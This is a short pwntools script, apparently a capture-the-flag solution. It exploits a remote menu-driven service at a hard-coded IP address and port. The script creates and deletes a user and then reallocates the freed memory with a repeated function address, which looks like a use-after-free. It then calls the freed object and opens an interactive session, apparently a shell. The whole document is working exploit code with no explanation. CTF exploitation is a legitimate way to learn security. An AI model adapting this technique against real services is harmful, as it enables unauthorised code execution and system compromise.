from pwn import *

r = remote('139.59.61.220', 12345)

r.sendline('1')
r.recvuntil('username:')
r.send('1' * 30)
r.send('1' * 30)
r.sendline('4')
r.recvuntil('Deleting User ...')
r.sendline('2')
time.sleep(2)
r.send(p32(0x804868b) * 7 + 'aa')
r.sendline('3')
r.interactive()